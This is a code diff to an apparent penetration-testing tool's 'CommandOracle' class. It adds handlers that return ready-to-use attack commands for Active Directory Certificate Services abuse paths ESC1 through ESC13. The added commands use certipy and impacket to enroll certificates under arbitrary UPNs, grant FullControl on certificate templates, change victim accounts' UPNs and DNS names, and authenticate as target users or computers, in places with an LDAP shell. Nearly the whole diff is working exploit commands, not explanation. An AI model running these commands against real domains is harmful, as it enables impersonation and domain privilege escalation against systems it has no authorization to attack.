@@ -264,6 +264,140 @@ class CommandOracle:
                 f"# Owner has full control; consider next steps like DACL modification or password reset"
             )
 
+        # ADCS ESC1
+        if normalized_edge == "ADCSESC1":
+            return (
+                "# ADCS ESC1: enroll auth-capable cert with arbitrary SAN/UPN\n"
+                f"certipy req -u {username}@{domain} -p <PASSWORD> -ca <CA-NAME> "
+                f"-target <CA-SERVER> -template <VULN_TEMPLATE> -upn <TARGET_USER>@{domain}\n"
+                "# Use issued certificate to authenticate as target\n"
+                "certipy auth -pfx <TARGET_USER>.pfx -dc-ip <DC_IP>"
+            )
+
+        # ADCS ESC3
+        if normalized_edge == "ADCSESC3":
+            return (
+                "# ADCS ESC3: abuse Enrollment Agent to request cert on behalf of another principal\n"
+                "# 1) Enroll Enrollment Agent cert\n"
+                f"certipy req -u {username}@{domain} -p <PASSWORD> -ca <CA-NAME> "
+                "-target <CA-SERVER> -template <ENROLLMENT_AGENT_TEMPLATE>\n"
+                "# 2) Request on-behalf-of cert for target principal\n"
+                f"certipy req -u {username}@{domain} -p <PASSWORD> -ca <CA-NAME> "
+                "-target <CA-SERVER> -template <AUTH_TEMPLATE> -on-behalf-of <TARGET_USER> "
+                "-pfx <AGENT_CERT>.pfx\n"
+                "# 3) Authenticate as target\n"
+                "certipy auth -pfx <TARGET_USER>.pfx -dc-ip <DC_IP>"
+            )
+
+        # ADCS ESC4
+        if normalized_edge == "ADCSESC4":
+            return (
+                "# ADCS ESC4: modify CertTemplate ACL/settings to make it ESC1-abusable, then abuse ESC1\n"
+                "# Grant template control (if needed)\n"
+                "impacket-dacledit -action write -rights FullControl -principal <ATTACKER> "
+                "-target-dn '<CERT_TEMPLATE_DN>' <DOMAIN>/<USER>:<PASS>\n"
+                "# Reconfigure template (Linux certipy shortcut)\n"
+                f"certipy template -username {username}@{domain} -password <PASSWORD> "
+                "-template <TEMPLATE_CN> -save-old\n"
+                "# Then execute ESC1 using the now-vulnerable template\n"
+                f"certipy req -u {username}@{domain} -p <PASSWORD> -ca <CA-NAME> "
+                "-target <CA-SERVER> -template <TEMPLATE_CN> -upn <TARGET_USER>@<DOMAIN>\n"
+                "certipy auth -pfx <TARGET_USER>.pfx -dc-ip <DC_IP>"
+            )
+
+        # ADCS ESC6a
+        if normalized_edge in ("ADCSESC6a", "ADCSESC6A"):
+            return (
+                "# ADCS ESC6a: CA EDITF_ATTRIBUTESUBJECTALTNAME2 allows arbitrary SAN impersonation\n"
+                f"certipy req -u {username}@{domain} -p <PASSWORD> -ca <CA-NAME> "
+                "-target <CA-SERVER> -template <PUBLISHED_TEMPLATE> -upn <TARGET_USER>@<DOMAIN>\n"
+                "# If strong mapping is enforced, include SID URL (commonly via Certify on Windows)\n"
+                "# Certify.exe request --ca <CA> --template <TEMPLATE> --upn <TARGET> --sid-url <TARGET_SID>\n"
+                "certipy auth -pfx <TARGET_USER>.pfx -dc-ip <DC_IP>"
+            )
+
+        # ADCS ESC6b
+        if normalized_edge in ("ADCSESC6b", "ADCSESC6B"):
+            return (
+                "# ADCS ESC6b: CA allows arbitrary SAN and target DC allows weak mapping\n"
+                f"certipy req -u {username}@{domain} -p <PASSWORD> -ca <CA-NAME> "
+                "-target <CA-SERVER> -template <PUBLISHED_TEMPLATE> -upn <TARGET_USER>@<DOMAIN>\n"
+                "# Authenticate as target with weak cert mapping on affected DC\n"
+                "certipy auth -pfx <TARGET_USER>.pfx -dc-ip <DC_IP>"
+            )
+
+        # ADCS ESC9a
+        if normalized_edge in ("ADCSESC9a", "ADCSESC9A"):
+            victim = source.name or "<VICTIM_PRINCIPAL>"
+            return (
+                "# ADCS ESC9a: weak mapping + no security extension + controlled victim UPN\n"
+                f"certipy account update -u {username}@{domain} -p <PASSWORD> "
+                f"-user {victim} -upn <TARGET_SAMACCOUNTNAME>\n"
+                "# Enroll cert as victim\n"
+                f"certipy req -u {victim} -p <VICTIM_PASSWORD> -ca <CA-NAME> "
+                "-target <CA-SERVER> -template <VULN_TEMPLATE>\n"
+                "# Restore victim UPN and authenticate as target on weak-mapping DC\n"
+                f"certipy account update -u {username}@{domain} -p <PASSWORD> "
+                f"-user {victim} -upn <ORIGINAL_UPN>\n"
+                "certipy auth -pfx <TARGET>.pfx -dc-ip <DC_IP>"
+            )
+
+        # ADCS ESC9b
+        if normalized_edge in ("ADCSESC9b", "ADCSESC9B"):
+            victim = source.name or "<VICTIM_COMPUTER>$"
+            return (
+                "# ADCS ESC9b: weak mapping + no security extension + controlled victim dNSHostName\n"
+                "# 1) Remove conflicting SPNs for victim if needed\n"
+                f"certipy account update -u {username}@{domain} -p <PASSWORD> "
+                f"-user {victim} -dns <TARGET_HOST>.{domain}\n"
+                "# 2) Enroll cert as victim computer\n"
+                f"certipy req -u {victim} -p <VICTIM_PASSWORD> -ca <CA-NAME> "
+                "-target <CA-SERVER> -template <VULN_TEMPLATE>\n"
+                "# 3) (Optional) restore victim dNSHostName/SPN, then authenticate as target computer\n"
+                "certipy auth -pfx <TARGET_HOST>.pfx -dc-ip <DC_IP>"
+            )
+
+        # ADCS ESC10a
+        if normalized_edge == "ADCSESC10a":
+            victim = source.name or "<VICTIM_PRINCIPAL>"
+            return (
+                "# ADCS ESC10a: UPN mapping abuse via controlled victim principal\n"
+                f"certipy account update -u {username}@{domain} -p <PASSWORD> "
+                f"-user {victim} -upn <TARGET_SAM>@{domain}\n"
+                "# Enroll certificate as victim on affected template/CA\n"
+                f"certipy req -u {victim} -p <VICTIM_PASSWORD> -ca <CA-NAME> "
+                "-target <CA-SERVER> -template <VULN_TEMPLATE>\n"
+                "# Restore victim UPN and authenticate with issued cert\n"
+                f"certipy account update -u {username}@{domain} -p <PASSWORD> -user {victim} -upn <ORIGINAL_UPN>\n"
+                "certipy auth -pfx <TARGET>.pfx -dc-ip <DC_IP> -ldap-shell"
+            )
+
+        # ADCS ESC10b
+        if normalized_edge == "ADCSESC10b":
+            victim = source.name or "<VICTIM_COMPUTER>$"
+            return (
+                "# ADCS ESC10b: dNSHostName mapping abuse via controlled computer\n"
+                "# 1) Remove conflicting SPNs on victim if needed\n"
+                "# 2) Set victim dNSHostName to target computer FQDN\n"
+                f"certipy account update -u {username}@{domain} -p <PASSWORD> "
+                f"-user {victim} -dns <TARGET_HOST>.{domain}\n"
+                "# 3) Enroll cert as victim computer\n"
+                f"certipy req -u {victim} -p <VICTIM_PASSWORD> -ca <CA-NAME> "
+                "-target <CA-SERVER> -template <VULN_TEMPLATE>\n"
+                "# 4) Authenticate as mapped target computer\n"
+                "certipy auth -pfx <TARGET_HOST>.pfx -dc-ip <DC_IP> -ldap-shell"
+            )
+
+        # ADCS ESC13
+        if normalized_edge == "ADCSESC13":
+            return (
+                "# ADCS ESC13: enroll via template with issuance policy OID->group link\n"
+                f"certipy req -u {username}@{domain} -p <PASSWORD> -ca <CA-NAME> "
+                "-target <CA-SERVER> -template <ESC13_TEMPLATE>\n"
+                "# Use issued certificate to obtain TGT / authenticate with group-derived privileges\n"
+                "certipy auth -pfx <USER>.pfx -dc-ip <DC_IP>"
+            )
+
         tool = EDGE_TOOL_MAP.get(normalized_edge, "manual")
         return (
             f"# Edge type '{normalized_edge}' requires manual enumeration or custom approach\n"
